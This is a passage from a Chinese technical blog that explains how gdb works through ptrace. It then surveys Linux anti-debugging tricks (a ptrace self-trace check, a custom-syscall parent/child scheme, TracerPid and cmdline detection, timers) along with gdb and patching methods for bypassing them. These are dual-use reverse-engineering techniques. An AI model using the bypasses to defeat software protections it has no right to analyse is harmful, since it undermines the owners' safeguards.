：表示本进程将被其父进程跟踪，此时剩下的pid、addr、data参数都没有实际意义可以全部为0</p><p>这个选项只能用在被调试的进程中，也是被调试的子进程唯一能用的request选项，其他的都只能用父进程调试器使用</p></li><li><p>PTRACE_ATTACH：attach到一个指定的进程，使其成为当前进程跟踪的子进程，而子进程的行为等同于它进行了一次PTRACE_TRACEME操作，可想而知，gdb的attach命令使用这个参数选项实现的</p><p><del>变成其他进程的爹，你就可以调试它</del></p></li><li><p>PTRACE_CONT：继续运行之前停止的子进程，也可以向子进程发送指定的信号，这个其实就相当于gdb中的continue命令</p></li></ul><p>除了上面的几个，还有很多操作子进程内存数据寄存器数据的request选项，详见man手册，这里不一一展开，</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191201144906-ab752400-1406-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191201144906-ab752400-1406-1.png" alt="img"></a></p><p>如上图所示，gdb调试的本质实际上就是父进程使用ptrace函数对子进程进行一系列的命令操作</p><p>这里举一个例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/ptrace.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;sys/reg.h&gt;   /* For constants ORIG_EAX etc */</span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt; /* SYS_write */</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">    pid_t child;</span><br><span class="line">    long orig_rax;</span><br><span class="line">    int status;</span><br><span class="line">    int iscalling = 0;</span><br><span class="line">    struct user_regs_struct regs;</span><br><span class="line"></span><br><span class="line">    child = fork();</span><br><span class="line">    if(child == 0) </span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME, 0, 0);//发送信号给父进程表示已做好准备被调试</span><br><span class="line">        execl(&quot;/bin/ls&quot;, &quot;ls&quot;, &quot;-l&quot;, &quot;-h&quot;, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        while(1)</span><br><span class="line">        &#123;</span><br><span class="line">            wait(&amp;status);//等待子进程发来信号或者子进程退出</span><br><span class="line">            if(WIFEXITED(status))</span><br><span class="line">            //WIFEXITED函数(宏)用来检查子进程是被ptrace暂停的还是准备退出</span><br><span class="line">            &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            orig_rax = ptrace(PTRACE_PEEKUSER, child, 8 * ORIG_RAX, 0);</span><br><span class="line">            //获取rax值从而判断将要执行的系统调用号</span><br><span class="line">            if(orig_rax == SYS_write)</span><br><span class="line">            &#123;//如果系统调用是write</span><br><span class="line">                ptrace(PTRACE_GETREGS, child, 0, &amp;regs);</span><br><span class="line">                if(!iscalling)</span><br><span class="line">                &#123;</span><br><span class="line">                    iscalling = 1;</span><br><span class="line">                    //打印出系统调用write的各个参数内容</span><br><span class="line">                    printf(&quot;SYS_write call with %p, %p, %p\n&quot;,</span><br><span class="line">                            regs.rdi, regs.rsi, regs.rdx);</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    printf(&quot;SYS_write call return %p\n&quot;, regs.rax);</span><br><span class="line">                    iscalling = 0;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ptrace(PTRACE_SYSCALL, child, 0, 0);</span><br><span class="line">            //PTRACE_SYSCALL,其作用是使内核在子进程进入和退出系统调用时都将其暂停</span><br><span class="line">            //得到处于本次调用之后下次调用之前的状态</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行后，会输出如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ gcc ./ptrace1.c -o ptrace1 &amp;&amp; ./ptrace1 </span><br><span class="line">SYS_write call with 0x1, 0x9e1020, 0xf</span><br><span class="line">总用量 940K</span><br><span class="line">SYS_write call return 0xf</span><br><span class="line">SYS_write call with 0x1, 0x9e1020, 0x35</span><br><span class="line">-rwxrwxr-x 1 zeref zeref 8.7K 11月 16 03:10 ptrace1</span><br><span class="line">SYS_write call return 0x35</span><br><span class="line">SYS_write call with 0x1, 0x9e1020, 0x37</span><br><span class="line">-rw-rw-r-- 1 zeref zeref  601 11月 16 03:10 ptrace1.c</span><br><span class="line">SYS_write call return 0x37</span><br><span class="line">SYS_write call with 0x1, 0x9e1020, 0x35</span><br><span class="line">-rwxrwxr-x 1 zeref zeref 8.7K 11月 16 03:16 ptrace2</span><br><span class="line">SYS_write call return 0x35</span><br><span class="line">SYS_write call with 0x1, 0x9e1020, 0x37</span><br><span class="line">-rw-rw-r-- 1 zeref zeref 1.3K 11月 16 03:16 ptrace2.c</span><br><span class="line">SYS_write call return 0x37</span><br><span class="line">SYS_write call with 0x1, 0x9e1020, 0x32</span><br><span class="line">-rwxrwxr-x 1 zeref zeref 892K 11月 15 22:57 test</span><br><span class="line">SYS_write call return 0x32</span><br><span class="line">SYS_write call with 0x1, 0x9e1020, 0x33</span><br><span class="line">-rwxrwxr-x 1 zeref zeref 8.4K 11月 15 22:51 test1</span><br><span class="line">SYS_write call return 0x33</span><br><span class="line">SYS_write call with 0x1, 0x9e1020, 0x35</span><br><span class="line">-rw-rw-r-- 1 zeref zeref  174 11月 15 22:51 test1.c</span><br><span class="line">SYS_write call return 0x35</span><br></pre></td></tr></table></figure><p>可以看到，每一次进行系统调用前以及调用后的寄存器内容都发生的变化，并且输出了<code>ls -l -h</code>的内容</p><p>这只是ptrace的部分功能，ptrace能做到的事情还有更多，比如还能修改内存，修改寄存器的值，插入字节码实现下断点的功能，这里仅仅简单介绍一下gdb调试器的大概实现原理</p><p>如果对编写调试器感兴趣的话，可以康康这个大佬的博客： <a href="https://veritas501.space/2017/10/16/翻译_编写一个Linux调试器/" target="_blank" rel="noopener">veritas501</a></p><h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p>介绍完调试的原理，就需要思考下一个问题，如果防止别人调试我们写好的程序？</p><p>最简单的办法如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/ptrace.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    if (ptrace(PTRACE_TRACEME, 0, 0, 0) ==-1 )</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;don&apos;t trace me:(\n&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;no one trace me:)\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据前面说的，只要能当其他进程的爹，就能调试他，但ptrace有个规定是，每个进程只能被<code>PTRACE_TRACEME</code>一次，因此只要程序的开头就先执行一次<code>ptrace(PTRACE_TRACEME, 0, 0, 0)</code>，当gdb再想attach的时候就会发现已经执行了一次不能再执行了从而返回-1</p><p><del>这大概就是我先当了我自己的爹，别人就不能当我爹吧</del></p><p>运行情况如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ./anti1 </span><br><span class="line">no one trace me:)</span><br><span class="line">----</span><br><span class="line">$ gdb ./anti1</span><br><span class="line">$pwndbg&gt; r</span><br><span class="line">Starting program: /home/zeref/桌面/debug&amp;anti/anti1 </span><br><span class="line">don&apos;t trace me:(</span><br><span class="line">[Inferior 1 (process 21216) exited with code 01]</span><br></pre></td></tr></table></figure><p>那如果遇到这种反调试该如何绕过呢？</p><p>一般有以下几种操作：</p><ol><li><p>打patch，把有关ptrace函数的部分nop掉</p></li><li><p>利用hook技术，把ptrace函数给替换成自定义的ptrace函数，从而可以任意指定它的返回值</p></li><li><p>充分利用gdb的catch命令，<code>catch syscall ptrace</code>会在发生ptrace调用的时候停下，因此在第二次停住的时候<code>set $rax=0</code>，从而绕过程序中<code>ptrace(PTRACE_TRACEME, 0, 0, 0) ==-1</code>的判断</p><p>效果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./anti1</span><br><span class="line"> $pwndbg&gt; catch syscall ptrace</span><br><span class="line"> Catchpoint 1 (syscall &apos;ptrace&apos; [101])</span><br><span class="line"> $pwndbg&gt; r</span><br><span class="line"> Starting program: /home/zeref/桌面/debug&amp;anti/anti1 </span><br><span class="line"> Catchpoint 1 (call to syscall ptrace), 0x00007ffff7b0ae2e in ptrace (request=PTRACE_TRACEME) at ../sysdeps/unix/sysv/linux/ptrace.c:45</span><br><span class="line"></span><br><span class="line"> $pwndbg&gt; c</span><br><span class="line"> Continuing.</span><br><span class="line"></span><br><span class="line"> Catchpoint 1 (returned from syscall ptrace), 0x00007ffff7b0ae2e in ptrace (request=PTRACE_TRACEME) at ../sysdeps/unix/sysv/linux/ptrace.c:45</span><br><span class="line"></span><br><span class="line"> 在连续si到即将执行ret时</span><br><span class="line"> $pwndbg&gt; set $rax=0</span><br><span class="line"> $pwndbg&gt; c</span><br><span class="line"> Continuing.</span><br><span class="line"> no one trace me:)</span><br><span class="line"> [Inferior 1 (process 21279) exited normally]</span><br></pre></td></tr></table></figure></li></ol><p><strong>那么问题又来了，如何防止我们的程序被这种骚操作绕过反调试呢？</strong></p><p>分析一下上面的绕过方法，发现本质上都是为了使得<code>ptrace(PTRACE_TRACEME, 0, 0, 0)</code>无效，因为使之无效化又不影响主程序的逻辑，那便可以完美绕过</p><p>所以这里一种方法是这样，想办法生成一个子进程，并且ptrace跟踪它，并且使他与父进程的运行逻辑密不可分，这样一来单纯的干掉一个ptrace函数调用就不能绕过反调试</p><p>比如，可以通过自己定义syscall的方式来实现父子进程之间的身份认证，确保子进程是与父进程在通讯，而不是与gdb在通讯</p><p>例子如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/ptrace.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line">#define SYS_CALL_myread 12345</span><br><span class="line">#define SYS_CALL_mywrite 67890</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void myread(char *str,int len)</span><br><span class="line">&#123;</span><br><span class="line">    syscall(SYS_CALL_myread, str,len,0);</span><br><span class="line">&#125;</span><br><span class="line">void mywrite(char *str)</span><br><span class="line">&#123;</span><br><span class="line">    syscall(SYS_CALL_mywrite, str,strlen(str),1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void tracee() </span><br><span class="line">&#123;</span><br><span class="line">    ptrace(PTRACE_TRACEME, 0, 0, 0);</span><br><span class="line">    raise(SIGCONT);//向自身发送SIGCONT信号，表示继续执行</span><br><span class="line">    char *str1=&quot;what is your name?\n&quot;;</span><br><span class="line">    static char name[0x10];</span><br><span class="line">    char *ptr_name=name;</span><br><span class="line">    mywrite(str1);</span><br><span class="line">    myread(ptr_name,0x10);</span><br><span class="line"></span><br><span class="line">    puts(&quot;welcome!&quot;);</span><br><span class="line">    mywrite(ptr_name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void tracer(pid_t child_pid)</span><br><span class="line">&#123;</span><br><span class="line">    int status;</span><br><span class="line">    struct user_regs_struct regs;</span><br><span class="line"></span><br><span class="line">    waitpid(child_pid, &amp;status, 0);</span><br><span class="line">    //如果子进程的ptrace被patch掉，则无法接收到status</span><br><span class="line">    if (!WIFSTOPPED(status))</span><br><span class="line">    &#123;//宏用来指出子进程是正常退出的，返回一个非零值</span><br><span class="line">        printf(&quot;gg\n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    ptrace(PTRACE_SETOPTIONS, child_pid, 0, PTRACE_O_EXITKILL);</span><br><span class="line">    //如果子进程处于退出状态则发送一个SIGKILL信号给它</span><br><span class="line"></span><br><span class="line">    while (WIFSTOPPED(status))</span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_SYSCALL, child_pid, 0, 0);//在子进程进程syscall之前断下</span><br><span class="line">        waitpid(child_pid, &amp;status, 0);</span><br><span class="line">        ptrace(PTRACE_GETREGS, child_pid, 0, &amp;regs);//获取寄存器值</span><br><span class="line"></span><br><span class="line">        if (regs.orig_rax == SYS_CALL_mywrite)</span><br><span class="line">        &#123;</span><br><span class="line">            //str,strlen(str),1</span><br><span class="line">            regs.orig_rax = SYS_write;</span><br><span class="line">            unsigned long long int tmp = regs.rdx;</span><br><span class="line">            regs.rdx = regs.rsi;</span><br><span class="line">            regs.rsi = regs.rdi;</span><br><span class="line">            regs.rdi=tmp;</span><br><span class="line"></span><br><span class="line">            ptrace(PTRACE_SETREGS, child_pid, 0, &amp;regs);</span><br><span class="line">            //设置寄存器值，使其改为正确的syscall</span><br><span class="line">        &#125;</span><br><span class="line">        if (regs.orig_rax == SYS_CALL_myread)</span><br><span class="line">        &#123;</span><br><span class="line">            //str,strlen(str),0</span><br><span class="line">            regs.orig_rax = SYS_read;</span><br><span class="line">            unsigned long long int tmp = regs.rdx;</span><br><span class="line">            regs.rdx = regs.rsi;</span><br><span class="line">            regs.rsi = regs.rdi;</span><br><span class="line">            regs.rdi=tmp;</span><br><span class="line">            ptrace(PTRACE_SETREGS, child_pid, 0, &amp;regs);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ptrace(PTRACE_SYSCALL, child_pid, 0, 0);</span><br><span class="line">        waitpid(child_pid, &amp;status, 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line">    pid_t child_pid = fork();</span><br><span class="line">    if (child_pid &lt; 0) </span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;gg\n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    if (child_pid == 0) </span><br><span class="line">    &#123;</span><br><span class="line">        tracee();</span><br><span class="line">    &#125; </span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        tracer(child_pid);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种方法可以在一定程度上加大反调试力度，但其实还是有办法应对的，可以通过逆向发现父子进程直接的互动无非就是syscall的系统调用号和参数的转换，那只要逆的明明白白，仍然可以强行打patch，把myread，mywrite又改回正常的read，write就可以绕过反调试了</p><p><strong>所以又该怎么样继续加大反调试的力度呢？</strong></p><p>可以考虑如下操作</p><ol><li>加大力度，定义更多的syscal来代替libc函数，增大逆向难度</li><li>不仅仅单纯的替换系统调用号和参数，可以加入数据的交互，比如通过管道通信添加加密与解密的操作</li><li>给程序加很多花里胡哨的混淆，增加理解程序逻辑难度</li><li>……</li></ol><p><strong>这大概就是攻击与防御的乐趣吧，如果哪位大佬还有更骚操作和想法请务必评论区分享一波</strong></p><h3 id="其他小技巧"><a href="#其他小技巧" class="headerlink" title="其他小技巧"></a>其他小技巧</h3><p>上面是专门针对ptrace进行的反调试与绕过反调试的分析，下面还有几种比较偏门的反调试措施，但是这些措施都比较容易绕过，通过打patch基本上都可以绕过，这里就简单介绍一下</p><p><strong>1.检测/proc/self/status</strong></p><p>检查 <code>/proc/self/status</code> 中的 <code>TracerPID</code> - 正常运行时为0，在有debugger挂载的情况下变为debugger的PID。因此通过不断读取这个值可以发现是否存在调试器，进行对应处理</p><p>例子如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/ptrace.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void test()</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    int TracerPid=0;</span><br><span class="line">    fp=fopen(&quot;/proc/self/status&quot;,&quot;r&quot;);</span><br><span class="line">    // printf(&quot;%p\n&quot;,fp);</span><br><span class="line">    static char buf[0x100];</span><br><span class="line">    char *ptr=&amp;buf;</span><br><span class="line">    while(fgets(ptr, 0x100, fp))</span><br><span class="line">    &#123;</span><br><span class="line">        if (strstr(ptr,&quot;TracerPid&quot;))</span><br><span class="line">        &#123;   </span><br><span class="line">            char tmp[0x10];</span><br><span class="line">            int len=strlen(ptr);</span><br><span class="line">            TracerPid=atoi((char *)ptr+len-3);</span><br><span class="line">            if (TracerPid != 0)</span><br><span class="line">            &#123;</span><br><span class="line">                puts(&quot;don&apos;t debug me!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    while(1)</span><br><span class="line">    &#123;</span><br><span class="line">        test();</span><br><span class="line">        sleep(1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似的操作还有扫描整个虚拟地址空间，在text段查找被修改的字节码，如当调试器下断点的时候实际上会插入int3的字节码，从而达到断下的目的，如果扫描到这些特征字节码（如0xcc等等）就马上停止程序，从而达到反调试的作用，同样的比较容易被绕过，这里就只提供一种思路，不再举具体例子</p><p><strong>2.检测/proc/self/cmdline</strong></p><p>这种操作本质上就是在检测输入的命令内容，如果输入执行<code>gdb ./xx</code>或者<code>strace ./xx</code>就会被检测到</p><p>总体还是还是比较鸡肋的，如果先进gdb在attach pid的话就检测不到。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) </span><br><span class="line">&#123;</span><br><span class="line">   char buf1[0x20], buf2[0x100];</span><br><span class="line">   FILE* fp;</span><br><span class="line"></span><br><span class="line">   snprintf(buf1, 24, &quot;/proc/%d/cmdline&quot;, getppid());</span><br><span class="line">   fp = fopen(buf1, &quot;r&quot;);</span><br><span class="line">   fgets(buf2, 0x100, fp);</span><br><span class="line">   fclose(fp);</span><br><span class="line"></span><br><span class="line">   if(!strcmp(buf2, &quot;gdb&quot;) || !strcmp(buf2, &quot;strace&quot;)||!strcmp(buf2, &quot;ltrace&quot;))</span><br><span class="line">   &#123;</span><br><span class="line">       printf(&quot;Debugger detected&quot;);</span><br><span class="line">       return 1;</span><br><span class="line">   &#125;  </span><br><span class="line">   printf(&quot;All good&quot;);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3.忽略int3异常信号</strong></p><p>调试中最常见的操作便是下断点，而一般的下断点的方法就是在即将执行的指令前插入int3的字节码 (CC) ，在程序执行到int3时，就会触发 SIGTRAP 信号，而调试器就会接收到这些信号进行并对子进程进行处理，而如果子进程通过设置signal函数忽略SIGTRAP  信号，就可以使得断点无效，也就能达到反调试的作用</p><p>但是这个操作似乎只适用于反调试远古时期的gdb，现在的最新版本gdb基本上都防不住，仅提供一种思路</p><p><strong>4.设置时间间隔</strong></p><p>在程序启动时，通过alarm设置定时，到达时则中止程序 ，这样就不能长时间调试程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void alarmHandler(int sig)</span><br><span class="line">&#123;</span><br><span class="line">   printf(&quot;don&apos; t debug me&quot;);</span><br><span class="line">   exit(1);</span><br><span class="line">&#125;</span><br><span class="line">void__attribute__((constructor))setupSig(void) </span><br><span class="line">&#123;//设置程序一开始就执行</span><br><span class="line">   signal(SIGALRM, alarmHandler);</span><br><span class="line">   alarm(3);</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char *argv[]) </span><br><span class="line">&#123;</span><br><span class="line">   getchar();</span><br><span class="line">   puts(&quot;hello!&quot;);</span><br><span class="line">   puts(&quot;hello!&quot;);</span><br><span class="line">   puts(&quot;hello!&quot;);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然还是比较容易绕过，方法很多很多</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.toby.moe/linux-anti-debugging/" target="_blank" rel="noopener">https://blog.toby.moe/linux-anti-debugging/</a></p><p><a href="http://www.voidcn.com/article/p-hogkwhfh-ys.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-hogkwhfh-ys.html</a></p><p><a href="https://blog.csdn.net/stonesharp/article/details/8211526" target="_blank" rel="noopener">https://blog.csdn.net/stonesharp/article/details/8211526</a></p><p><a href="http://drops.xmd5.com/static/drops/mobile-16969.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/mobile-16969.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>IDA脚本笔记一</title>
      <link href="/2019/12/10/IDA%E2%95%9C%E2%94%BC%E2%96%92%E2%95%9B%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F%E2%95%A5%E2%95%97/"/>
      <url>/2019/12/10/IDA%E2%95%9C%E2%94%BC%E2%96%92%E2%95%9B%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F%E2%95%A5%E2%95%97/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-读取和修改数据的函数"><a href="#0x01-读取和修改数据的函数" class="headerlink" title="0x01 读取和修改数据的函数"></a>0x01 读取和修改数据的函数</h2><h3 id="01-Byte"><a href="#01-Byte" class="headerlink" title="01 Byte"></a>01 Byte</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">Byte</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure><p>从虚拟地址<strong>addr</strong>处读取一个字节值</p><h3 id="02-Word"><a href="#02-Word" class="headerlink" title="02 Word"></a>02 Word</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">Word</span><span class="params">(<span class="keyword">long</span> 